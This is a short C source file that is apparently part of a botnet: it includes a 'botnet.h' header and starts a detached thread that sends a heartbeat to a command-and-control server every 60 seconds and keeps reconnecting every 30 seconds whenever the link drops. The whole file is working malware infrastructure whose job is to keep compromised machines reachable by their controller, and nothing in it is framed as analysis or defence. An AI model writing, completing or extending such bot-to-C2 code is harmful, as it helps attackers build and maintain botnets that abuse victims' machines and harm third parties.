#include "../../include/botnet.h"
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>

// The thread function that sends heartbeats
void *heartbeat_thread(void *args) {
    while (1) {
        // Wait for 60 seconds before sending the next heartbeat
        sleep(60);

        printf("[*] Sending heartbeat to C2 server...\n");
        if (c2_send("HEARTBEAT", 9) < 0) {
            printf("[-] Failed to send heartbeat. Connection lost.\n");
            printf("[*] Attempting to reconnect to C2 server...\n");

            // Disconnect and try to reconnect in a loop
            c2_disconnect();
            while (!c2_connect()) {
                printf("[-] Reconnect failed. Retrying in 30 seconds...\n");
                sleep(30);
            }
            printf("[+] Reconnected to C2 server.\n");
        }
    }
    return NULL;
}

void start_heartbeat() {
    pthread_t thread_id;
    if (pthread_create(&thread_id, NULL, heartbeat_thread, NULL) != 0) {
        perror("pthread_create");
        return;
    }
    // Detach the thread so we don't have to join it later
    pthread_detach(thread_id);
    printf("[+] Heartbeat thread started.\n");
}
